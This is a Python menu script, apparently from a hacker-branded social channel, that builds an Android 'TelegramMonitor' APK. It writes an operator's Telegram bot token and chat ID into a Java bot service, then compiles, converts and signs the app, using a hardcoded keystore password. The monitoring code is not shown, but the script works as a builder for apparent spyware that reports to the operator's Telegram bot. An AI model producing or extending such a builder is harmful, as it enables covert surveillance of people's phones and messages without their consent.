# Full TelegramMonitor Builder Structure Setup with Main Menu
# This script assumes you've already placed all the necessary Java files
# and structure correctly in your TelegramMonitor-Builder directory

import os
import time
import webbrowser
from getpass import getpass

# Global Config
REPO_PATH = "TelegramMonitor-Builder"
JAVA_SRC = f"{REPO_PATH}/java"
BIN_PATH = f"{REPO_PATH}/bin"
APK_OUTPUT = f"{REPO_PATH}/TelegramMonitor.apk"
PACKAGE_NAME = "com.nehal.telegrammonitor"
MAIN_ACTIVITY = "com.nehal.telegrammonitor.MainActivity"


def play_sound():
    try:
        os.system("mpv sound.mp3 --no-video > /dev/null 2>&1 &")
    except:
        pass


def animate_start():
    play_sound()
    for i in range(3):
        print("\033[1;32m[+] Loading Tool" + "." * (i + 1) + "\033[0m")
        time.sleep(1)
    os.system("clear")


def banner():
    os.system("clear")
    print("\033[1;31m=============================")
    print("     TELEGRAM MONITARING PRO")
    print("=============================")
    print("TOLL OWNER: NEHAL DARK TRAP")
    print("YT: NEHAL DARK TRAP")
    print("INSTA: nehal_dark_trap")
    print("=============================\033[0m")


def open_link(url):
    try:
        os.system(f"xdg-open '{url}' > /dev/null 2>&1 &")
    except:
        webbrowser.open(url)


def subscription_lock():
    while True:
        banner()
        print("\033[1;32m1. Subscribe Channel")
        print("2. Already Subscribed\033[0m")
        print("\033[1;31m", end="")
        choice = input("Enter your choice (1/2): ")
        print("\033[0m", end="")

        if choice == "1":
            print("\n🔁 Opening YouTube Channel...")
            open_link("https://youtube.com/@nehal_dark_trap?si=CGE96-qu0BhVGHvi")
            print("📌 After subscribing, select 2 to continue.")
            time.sleep(2)
        elif choice == "2":
            print("✅ Subscription confirmed.")
            time.sleep(1)
            break
        else:
            print("❌ Invalid choice. Try again.")
            time.sleep(1)


def compile_java():
    os.makedirs(BIN_PATH, exist_ok=True)
    print("\n⚙️ Compiling Java files...")
    os.system(f"ecj -sourcepath {JAVA_SRC} -d {BIN_PATH} {JAVA_SRC}/com/nehal/telegrammonitor/*.java")


def convert_dex():
    print("⚙️ Converting to DEX format...")
    os.system(f"dx --dex --output={REPO_PATH}/classes.dex {BIN_PATH}")


def build_apk():
    print("⚙️ Building unsigned APK...")
    os.system(f"aapt package -f -M {REPO_PATH}/AndroidManifest.xml -S {REPO_PATH}/res -I $PREFIX/share/aapt/android.jar -F {REPO_PATH}/unsigned.apk {BIN_PATH}")
    os.system(f"aapt add {REPO_PATH}/unsigned.apk {REPO_PATH}/classes.dex")
    print("🔐 Signing APK...")
    os.system(f"apksigner sign --ks my-release-key.jks --ks-pass pass:123456 --key-pass pass:123456 --out {APK_OUTPUT} {REPO_PATH}/unsigned.apk")
    print(f"✅ APK Build Complete: {APK_OUTPUT}")


def build_menu():
    token = input("\n🔐 Enter your Telegram Bot Token: ")
    chat_id = input("🆔 Enter your Telegram Chat ID: ")

    bot_file = f"{JAVA_SRC}/com/nehal/telegrammonitor/BotService.java"
    with open(bot_file, "r") as f:
        content = f.read()

    # Replace placeholders with user values
    content = content.replace("YOUR_BOT_TOKEN_HERE", token)
    content = content.replace("YOUR_CHAT_ID_HERE", chat_id)

    with open(bot_file, "w") as f:
        f.write(content)

    compile_java()
    convert_dex()
    build_apk()


def main_menu():
    while True:
        banner()
        print("\033[1;36m1. Join Telegram Group")
        print("2. Follow on Instagram")
        print("3. Build Apk\033[0m")
        choice = input("\n📥 Enter your choice: ")

        if choice == "1":
            open_link("https://t.me/nehal_dark_trap")
        elif choice == "2":
            open_link("https://instagram.com/nehal_dark_trap")
        elif choice == "3":
            build_menu()
        else:
            print("\n❌ Invalid choice!")
        input("\n🔁 Press Enter to return to menu...")


if __name__ == '__main__':
    animate_start()
    subscription_lock()
    main_menu()